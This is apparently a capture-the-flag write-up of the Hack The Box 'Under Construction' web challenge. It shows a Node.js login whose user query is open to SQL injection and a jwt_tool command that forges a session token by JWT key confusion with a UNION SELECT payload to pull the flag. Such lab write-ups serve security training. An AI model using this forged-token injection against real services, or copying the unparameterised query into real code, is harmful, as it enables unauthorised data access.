---
layout: post
title: Hack The Box - Under Construction
date: 2023-03-03 20:26 +0100
image:
  path: /assets/img/posts/under-construction/under-construction-card.png
  alt: Under construction card
categories: [Hack The Box, Beginner Track]
tags: [Hack-The-Box-Easy, jwt-key-confusion]
hidden: false
---

```
CHALLENGE DESCRIPTION : A company that specialises in web development is creating a new site that is currently under construction. Can you obtain the flag?
HOST : 188.166.150.33:32674
FILE : 1 zip folder (Under Construction)
```

## Tools used

- [jwt io](https://jwt.io/) : allows you to decode, verify and generate JWT.
- [JWT tool](https://github.com/ticarpi/jwt_tool/tree/master) : jwt_tool is a toolkit for validating, forging, scanning and tampering JWTs (JSON Web Tokens).

## What to do ?

- First, we'll scan the given port with `nmap` to see what service is running on that port.

## Nmap scan

```
rether> nmap -A -p 32674 188.166.150.33
PORT      STATE SERVICE VERSION
32674/tcp open  http    Node.js Express framework
| http-title: Under Construction - Login
|_Requested resource was /auth
```

This website runs on a nodejs express server

## Under construction

![Auth login](/assets/img/posts/under-construction/under-construction-auth.png "Auth login")

After basic attempts with the default usernames and passwords, We create a new account by clicking on the register button.
After login, we will see this page :

![Auth login success](/assets/img/posts/under-construction/under-construction-home-panel.png "Auth login success")

Before continuing, we will try to find a vulnerability in the code.

After some research, we found an sql injection in the `DBHelper.js` file on line 9 :

```js
getUser(username){
    return new Promise((res, rej) => {
        db.get(`SELECT * FROM users WHERE username = '${username}'`, (err, data) => {
            if (err) return rej(err);
            res(data);
        });
    });
},
```

This method is called when you try to access this website. The code checks if you have a session cookie. To get this cookie, we can go to a web browser, open the developer tool and go to the storage tab. It look like this :

![Cookie session](/assets/img/posts/under-construction/under-construction-storage-panel.png "Cookie session")

Looking at the session cookie, we see that it is a jwt token (it starts with "ey" and has three parts separated by dots)

```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJwayI6Ii0tLS0tQkVHSU4gUFVCTElDIEtFWS0tLS0tXG5NSUlCSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVE4QU1JSUJDZ0tDQVFFQTk1b1RtOUROemNIcjhnTGhqWmFZXG5rdHNiajFLeHhVT296dzB0clA5M0JnSXBYdjZXaXBRUkI1bHFvZlBsVTZGQjk5SmM1UVowNDU5dDczZ2dWRFFpXG5YdUNNSTJob1VmSjFWbWpOZVdDclNyRFVob2tJRlpFdUN1bWVod3d0VU51RXYwZXpDNTRaVGRFQzVZU1RBT3pnXG5qSVdhbHNIai9nYTVaRUR4M0V4dDBNaDVBRXdiQUQ3MytxWFMvdUN2aGZhamdwekhHZDlPZ05RVTYwTE1mMm1IXG4rRnluTnNqTk53bzVuUmU3dFIxMldiMllPQ3h3MnZkYW1PMW4xa2YvU015cFNLS3ZPZ2o1eTBMR2lVM2plWE14XG5WOFdTK1lpWUNVNU9CQW1UY3oydzJrekJoWkZsSDZSSzRtcXVleEpIcmEyM0lHdjVVSjVHVlBFWHBkQ3FLM1RyXG4wd0lEQVFBQlxuLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tXG4iLCJpYXQiOjE2NzgwMzMyNjd9.EIJxcJw7F7gJwCFoVpDX-wXIBNLYPqu_Dx5m9bEt5FH4PwjUw-mT51kZ5hluFfjac-kY7fIjoEyb2rrz1pq4uUrVCeCKabhpLo6T6YixatTxR1EctdA14meM5K99veQdl4mpOHSoDOTC6kFMDCab78Rbxij8diWP3iaXwffw0S4hOhuU7UtF2A2d6dQMePs6cOQ1oTLiGJhblFfr7O91JlhndWmZH-plIjH9s63EMLbJPzHu8xrNu2Db_To86zg4z0WdhgOfqtMVzzNXw0L-QggvdcI45nWpHaeH0tBMXa2-fJKJzxH7JvScq6nkmAVYcdGGsAW1QyVmCTBudYFCJg
```

With this online tool [jwt io](https://jwt.io/), we can see what is in the token.

In the decode box we have the username and the public key. Save this public key value in a file.

After quick research, we found this [tool](https://github.com/ticarpi/jwt_tool/tree/master). Then we can try union injections to find the fulnerabilities to find the table who containt the flag. Below what we use to find this flag.

```bash
rether> ./jwt_tool.py [jwt token] -I -pc username -pv "admin' AND '1'='1' UNION SELECT 1,(SELECT top_secret_flaag FROM flag_storage),3;--" -X k -pk public.pem
```

> Command explained :

- `-I` : inject new claims and update existing claims with new values
- `-pc` : payload key
- `-pv` : payload value (sql injection)
- `-X` : eXploit known vulnerabilities
- `-pk` : public key
  {: .prompt-info }

And we use `burpsuite` to intercept the request and change the token

## Flag JWT - tool :

```
HTB{...}
```

![Under construction pwned](/assets/img/posts/under-construction/under-contruction-pwned.png "Under construction pwned")
